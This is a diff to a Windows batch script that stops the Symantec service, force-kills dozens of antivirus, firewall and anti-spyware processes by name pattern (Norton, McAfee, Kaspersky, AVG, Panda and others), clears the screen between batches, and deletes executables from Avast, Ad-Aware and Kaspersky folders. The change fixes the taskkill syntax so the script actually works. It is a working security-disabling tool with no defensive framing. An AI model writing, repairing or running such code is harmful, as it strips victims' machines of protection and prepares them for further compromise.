@@ -1,81 +1,81 @@
-@ echo off
+@echo off
 net stop "symantec antivirus"
-taskkill /A av*
-taskkill /A fire*
-taskkill /A anti*
+taskkill /f /IM av*
+taskkill /f /IM fire*
+taskkill /f /IM anti*
 cls
-taskkill /A spy*
-taskkill /A bullguard
-taskkill /A PersFw
-taskkill /A KAV*
-taskkill /A ZONEALARM
-taskkill /A SAFEWEB
+taskkill /f /IM spy*
+taskkill /f /IM bullguard
+taskkill /f /IM PersFw
+taskkill /f /IM KAV*
+taskkill /f /IM ZONEALARM
+taskkill /f /IM SAFEWEB
 cls
-taskkill /A OUTPOST
-taskkill /A nv*
-taskkill /A nav*
-taskkill /A F-*
-taskkill /A ESAFE
-taskkill /A cle
+taskkill /f /IM OUTPOST
+taskkill /f /IM nv*
+taskkill /f /IM nav*
+taskkill /f /IM F-*
+taskkill /f /IM ESAFE
+taskkill /f /IM cle
 cls
-taskkill /A BLACKICE
-taskkill /A def*
-taskkill /A kav
-taskkill /A kav*
-taskkill /A avg*
-taskkill /A ash*
+taskkill /f /IM BLACKICE
+taskkill /f /IM def*
+taskkill /f /IM kav
+taskkill /f /IM kav*
+taskkill /f /IM avg*
+taskkill /f /IM ash*
 cls
-taskkill /A aswupdsv
-taskkill /A ewid*
-taskkill /A guard*
-taskkill /A guar*
-taskkill /A gcasDt*
-taskkill /A msmp*
+taskkill /f /IM aswupdsv
+taskkill /f /IM ewid*
+taskkill /f /IM guard*
+taskkill /f /IM guar*
+taskkill /f /IM gcasDt*
+taskkill /f /IM msmp*
 cls
-taskkill /A mcafe*
-taskkill /A mghtml
-taskkill /A msiexec
-taskkill /A outpost
-taskkill /A isafe
-taskkill /A zap*
+taskkill /f /IM mcafe*
+taskkill /f /IM mghtml
+taskkill /f /IM msiexec
+taskkill /f /IM outpost
+taskkill /f /IM isafe
+taskkill /f /IM zap*
 cls
-taskkill /A zauinst
-taskkill /A upd*
-taskkill /A zlclien*
-taskkill /A minilog
-taskkill /A cc*
-taskkill /A norton*
+taskkill /f /IM zauinst
+taskkill /f /IM upd*
+taskkill /f /IM zlclien*
+taskkill /f /IM minilog
+taskkill /f /IM cc*
+taskkill /f /IM norton*
 cls
-taskkill /A norton au*
-taskkill /A ccc*
-taskkill /A npfmn*
-taskkill /A loge*
-taskkill /A nisum*
-taskkill /A issvc
-taskkill /A tmp*
+taskkill /f /IM norton au*
+taskkill /f /IM ccc*
+taskkill /f /IM npfmn*
+taskkill /f /IM loge*
+taskkill /f /IM nisum*
+taskkill /f /IM issvc
+taskkill /f /IM tmp*
 cls
-taskkill /A tmn*
-taskkill /A pcc*
-taskkill /A cpd*
-taskkill /A pop*
-taskkill /A pav*
-taskkill /A padmin
+taskkill /f /IM tmn*
+taskkill /f /IM pcc*
+taskkill /f /IM cpd*
+taskkill /f /IM pop*
+taskkill /f /IM pav*
+taskkill /f /IM padmin
 cls
-taskkill /A panda*
-taskkill /A avsch*
-taskkill /A sche*
-taskkill /A syman*
-taskkill /A virus*
-taskkill /A realm*
+taskkill /f /IM panda*
+taskkill /f /IM avsch*
+taskkill /f /IM sche*
+taskkill /f /IM syman*
+taskkill /f /IM virus*
+taskkill /f /IM realm*
 cls
-taskkill /A sweep*
-taskkill /A scan*
-taskkill /A ad-*
-taskkill /A safe*
-taskkill /A avas*
-taskkill /A norm*
+taskkill /f /IM sweep*
+taskkill /f /IM scan*
+taskkill /f /IM ad-*
+taskkill /f /IM safe*
+taskkill /f /IM avas*
+taskkill /f /IM norm*
 cls
-taskkill /A offg*
+taskkill /f /IM offg*
 del /Q /F C:\Program Files\alwils~1\avast4\*.*
 del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
 del /Q /F C:\Program Files\kasper~1\*.exe
